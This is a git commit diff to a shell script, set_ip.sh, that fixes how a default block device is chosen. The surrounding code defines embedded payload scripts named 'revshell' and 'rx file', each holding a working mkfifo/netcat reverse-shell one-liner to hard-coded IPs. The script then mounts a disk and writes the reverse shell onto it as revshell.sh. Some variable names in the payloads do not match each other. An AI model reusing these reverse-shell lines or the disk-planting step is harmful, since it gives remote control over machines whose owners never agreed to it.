fd05b115f69de90112b5792e9b59f1e11a88642f
Emlyn Matheson <emlyn@emlyn.xyz>
2026-05-22 15:11:06 +1000

    fix:fix defaults in set_ip script

--- library/set_ip.sh
+++ library/set_ip.sh
@@ -13,10 +13,12 @@ IO_PORT=1339
 RS_BOOK="#!/bin/sh\n# Name: revshell\n# Author: em\n\necho 'loading...'\nsleep 5\n\nHOST_IP=10.165.55.11\nHOST_PORT=1337\n\necho \"-- ip diag --\"\nip addr\necho '' >&2\n\necho \"-- load revshell --\" >&2\necho \"    target $HOST_IP:$RS_PORT\" >&2\necho \"    timeout 30s\" >&2\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /dev/fd/2 | nc -w 30 $HOST_IP $RS_PORT > /tmp/f"
 RF_BOOK="#!/bin/sh\n# Name: rx file\n# Author: em\n\nRX_IP=10.253.152.12\nRX_PORT=1338\n\necho \"-- rx executable --\" >&2\necho \"   origin $HOST_IP:$RF_PORT\" >&2\necho \"   timeout 30s\" >&2\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /dev/fd/2 | nc -w 30 $HOST_IP $RF_PORT > /tmp/f"
 
-BLK=$1
-if [[ -z $BLK ]]; then 
-    BLK="/dev/sda1"
+BLK="/dev/sda1"
+set +u
+if [[ -v $1 ]]; then
+    BLK=$1
 fi;
+set -u
 
 sudo mount $BLK /mnt
 sudo echo -e $RS_BOOK > /mnt/documents/revshell.sh
